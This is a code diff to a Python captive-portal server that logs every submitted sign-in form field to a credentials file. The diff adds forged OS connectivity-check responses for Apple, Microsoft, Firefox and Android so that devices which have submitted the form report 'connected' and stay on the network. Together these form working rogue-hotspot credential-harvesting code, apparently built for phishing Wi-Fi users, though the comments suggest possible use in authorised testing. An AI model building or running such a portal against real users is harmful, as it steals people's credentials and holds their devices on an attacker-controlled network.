@@ -52,6 +52,26 @@ def is_probe_path(path, host=""):
     return (host or "").split(":", 1)[0].lower() in _PROBE_HOSTS
 
 
+_APPLE_SUCCESS = ("<HTML><HEAD><TITLE>Success</TITLE></HEAD>"
+                  "<BODY>Success</BODY></HTML>\n")
+
+
+def probe_success(path, host=""):
+    """The response that tells an OS connectivity check the network is *good*, so
+    the device flips to "connected" and stops nagging / dropping the network.
+    Served only once a client has signed in (the walled garden opening). Each OS
+    wants its own shape; the default is HTTP 204 (Android / Chrome OS)."""
+    h = (host or "").split(":", 1)[0].lower()
+    p = (path or "").split("?", 1)[0].rstrip("/") or "/"
+    if "apple" in h or p in ("/hotspot-detect.html", "/library/test/success.html"):
+        return Response(200, "text/html", _APPLE_SUCCESS, None, None)
+    if "msft" in h or p in ("/ncsi.txt", "/connecttest.txt"):
+        return Response(200, "text/plain", "Microsoft NCSI", None, None)
+    if "firefox" in h or p in ("/success.txt", "/canonical.html"):
+        return Response(200, "text/plain", "success\n", None, None)
+    return Response(204, "text/html", "", None, None)   # Android generate_204
+
+
 # A neutral built-in portal used when the operator ships no template. It is
 # deliberately generic -- no real brand, no logo -- and says what it is.
 DEFAULT_PORTAL = """<!doctype html>
@@ -119,10 +139,13 @@ def redirect_body(location):
             % (location, location))
 
 
-def route(method, path, fields, template_dir=None, host="", portal_ip=""):
+def route(method, path, fields, template_dir=None, host="", portal_ip="",
+          authed=False):
     """Decide the response for one request. Pure: no I/O, no recording.
 
     - ``POST`` with any form fields -> record them, serve the "connected" page.
+    - a signed-in client's OS connectivity probe -> a success response, so the
+      phone flips to "connected" and stops dropping the network.
     - ``GET`` of a portal path (``/`` etc.) -> serve the portal page (200).
     - any other ``GET`` (an OS captive probe, favicon, a random URL) -> a 302
       **redirect** to the portal, which is what reliably pops the sign-in window.
@@ -130,6 +153,8 @@ def route(method, path, fields, template_dir=None, host="", portal_ip=""):
     if (method or "GET").upper() == "POST" and fields:
         return Response(200, "text/html; charset=utf-8",
                         render_done(template_dir), None, dict(fields))
+    if authed and is_probe_path(path, host):
+        return probe_success(path, host)
     if _norm_path(path) in _PORTAL_PATHS:
         return Response(200, "text/html; charset=utf-8",
                         render_portal(template_dir), None, None)
@@ -195,20 +220,29 @@ def serve(template_dir, creds_path, host="0.0.0.0", port=80, portal_ip=""):  # p
     from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
     from urllib.parse import parse_qs
 
+    # Clients (by IP) who have submitted the sign-in form. Their OS probes get a
+    # success response from here on, so the phone shows "connected" instead of
+    # "no internet" and stops dropping the network. In-memory, per run.
+    authed_clients = set()
+
     def _respond(h, resp):
         body = resp.body.encode("utf-8")
         h.send_response(resp.status)
         if resp.location:
             h.send_header("Location", resp.location)
-        h.send_header("Content-Type", resp.content_type)
-        h.send_header("Content-Length", str(len(body)))
+        # A 204 carries no body (that is the whole point of generate_204); some
+        # Android builds distrust a 204 that ships Content-Type/Length.
+        if resp.status != 204:
+            h.send_header("Content-Type", resp.content_type)
+            h.send_header("Content-Length", str(len(body)))
         h.send_header("Cache-Control", "no-store")
         # Close every connection: captive clients fire probes in bursts and
         # reuse keep-alive sockets, which desyncs and makes Chrome retry until
         # it gives up with ERR_TOO_MANY_RETRIES. One request per connection.
         h.send_header("Connection", "close")
         h.end_headers()
-        h.wfile.write(body)
+        if body:
+            h.wfile.write(body)
 
     class Handler(BaseHTTPRequestHandler):
         # HTTP/1.0 => no keep-alive; each request is its own connection.
@@ -222,9 +256,12 @@ def serve(template_dir, creds_path, host="0.0.0.0", port=80, portal_ip=""):  # p
 
         def do_GET(self):
             hosth = self.headers.get("Host", "")
-            resp = route("GET", self.path, {}, template_dir, hosth, portal_ip)
-            _elog("GET %s host=%s from=%s -> %d%s" % (
-                self.path, hosth, self._client(), resp.status,
+            authed = self._client() in authed_clients
+            resp = route("GET", self.path, {}, template_dir, hosth, portal_ip,
+                         authed)
+            _elog("GET %s host=%s from=%s%s -> %d%s" % (
+                self.path, hosth, self._client(),
+                " (signed-in)" if authed else "", resp.status,
                 " (captive probe)" if is_probe_path(self.path, hosth) else ""))
             _respond(self, resp)
 
@@ -237,9 +274,13 @@ def serve(template_dir, creds_path, host="0.0.0.0", port=80, portal_ip=""):  # p
             if resp.recorded:
                 try:
                     record_cred(creds_path, resp.recorded, self._client())
-                    _elog("POST %s from=%s CAPTURED %d field(s): %s" % (
-                        self.path, self._client(), len(resp.recorded),
-                        ",".join(sorted(resp.recorded))))
+                    # The client signed in: open the gate so its OS marks the
+                    # network connected (stops the "no internet" drop).
+                    authed_clients.add(self._client())
+                    _elog("POST %s from=%s CAPTURED %d field(s): %s"
+                          " [client marked connected]" % (
+                              self.path, self._client(), len(resp.recorded),
+                              ",".join(sorted(resp.recorded))))
                 except OSError as exc:
                     _elog("POST %s from=%s could not record: %s"
                           % (self.path, self._client(), exc))
